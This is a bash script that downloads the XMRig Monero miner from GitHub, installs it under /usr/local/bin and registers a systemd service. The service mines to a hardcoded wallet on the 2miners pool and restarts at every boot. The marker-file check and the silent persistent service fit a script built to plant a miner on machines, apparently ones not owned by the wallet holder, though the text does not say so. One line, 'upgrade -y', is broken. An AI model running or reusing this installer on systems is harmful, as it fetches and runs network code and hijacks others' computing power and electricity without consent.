SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/longtamnek.txt" ];
then
	echo "long deptraivlon" > longtamnek.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
        sudo apt update && upgrade -y
        sudo apt-get install libcurl3 -y
        sudo wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-bionic-x64.tar.gz
        sudo tar xvzf xmrig-6.18.1-bionic-x64.tar.gz
        sudo bash -c 'echo -e "[Unit]\nDescription=XMR Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -U -P 86N2TuniJazbv6Mrf4jXnJfbC4w8bUN6M53wC1kyfYAt6BmY7nqDjx7YG663X1C4zXQN2LafC695K147QQBpbLfLNwzV9rZ.$1@xmr.2miners.com:2222 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmr.service'
	sudo systemctl daemon-reload
	sudo systemctl enable xmr.service
	sudo systemctl start xmr.service
else
	sudo systemctl start xmr.service
fi
